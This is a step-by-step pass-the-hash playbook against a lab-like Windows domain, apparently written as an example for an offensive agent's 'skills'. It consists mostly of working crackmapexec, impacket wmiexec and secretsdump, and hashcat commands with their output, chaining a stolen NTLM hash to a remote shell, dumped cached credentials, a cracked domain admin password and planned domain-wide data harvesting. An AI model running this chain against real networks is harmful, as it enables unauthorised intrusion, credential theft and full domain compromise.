# Pass-the-Hash Lateral Movement Chain

## Scenario
Extracted NTLM hash for `admin` user, testing across multiple hosts.

## Step 1: Spray Hash Across Hosts
```bash
$ crackmapexec smb 10.10.10.0/24 -u admin -H 'aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b' --continue-on-success

SMB  10.10.10.50  445  WKSTN01  [*] Windows 10 Build 19041 (name:WKSTN01) (domain:MEGACORP.LOCAL)
SMB  10.10.10.50  445  WKSTN01  [+] MEGACORP.LOCAL\admin:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
SMB  10.10.10.55  445  WKSTN02  [*] Windows 10 Build 19045 (name:WKSTN02) (domain:MEGACORP.LOCAL)
SMB  10.10.10.55  445  WKSTN02  [+] MEGACORP.LOCAL\admin:64f12cddaa88057e06a81b54e73b949b
SMB  10.10.10.80  445  WEB01    [*] Windows Server 2019 Build 17763 (name:WEB01) (domain:MEGACORP.LOCAL)
SMB  10.10.10.80  445  WEB01    [+] MEGACORP.LOCAL\admin:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
SMB  10.10.10.100 445  DC01     [*] Windows Server 2019 Build 17763 (name:DC01) (domain:MEGACORP.LOCAL)
SMB  10.10.10.100 445  DC01     [+] MEGACORP.LOCAL\admin:64f12cddaa88057e06a81b54e73b949b
```

## Step 2: Get Shell on Pwn3d Host
```bash
$ impacket-wmiexec -hashes :64f12cddaa88057e06a81b54e73b949b MEGACORP.LOCAL/admin@10.10.10.50

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Timeout is 120 seconds
C:\> whoami
megacorp\admin

C:\> hostname
WKSTN01
```

## Step 3: Dump Creds on New Host
```bash
$ impacket-secretsdump -hashes :64f12cddaa88057e06a81b54e73b949b MEGACORP.LOCAL/admin@10.10.10.50

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9f3e2d1c0b9a8f7...:::
[*] Dumping cached domain logon information (domain/username:hash)
MEGACORP.LOCAL/t.johnson:$DCC2$10240#t.johnson#c4d5e6f7a8b9c0d1...
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
  dpapi_machinekey: 0x1a2b3c4d5e6f...
  dpapi_userkey: 0xf6e5d4c3b2a1...
[*] NL$KM
  NL$KM: 0x9a8b7c6d5e4f...
```

## Step 4: Crack Cached Credentials
```bash
$ hashcat -m 2100 dcc2_hash.txt /usr/share/wordlists/rockyou.txt
$DCC2$10240#t.johnson#c4d5e6f7a8b9c0d1...:Johnson2024!

# t.johnson is a Domain Admin!
$ crackmapexec smb 10.10.10.100 -u t.johnson -p 'Johnson2024!' -d MEGACORP.LOCAL
SMB  10.10.10.100  445  DC01  [+] MEGACORP.LOCAL\t.johnson:Johnson2024! (Pwn3d!)
```

## Attack Path
```
admin NTLM hash
  → PTH spray: admin on WKSTN01 (local admin)
    → secretsdump: cached t.johnson DCC2 hash
      → hashcat crack: Johnson2024!
        → t.johnson is Domain Admin
          → DCSync / full domain compromise
```

## Next Steps
→ **credential_access skill**: DCSync with t.johnson DA credentials
→ **collection skill**: Harvest all sensitive data from domain
→ **impact skill**: Document full domain compromise path
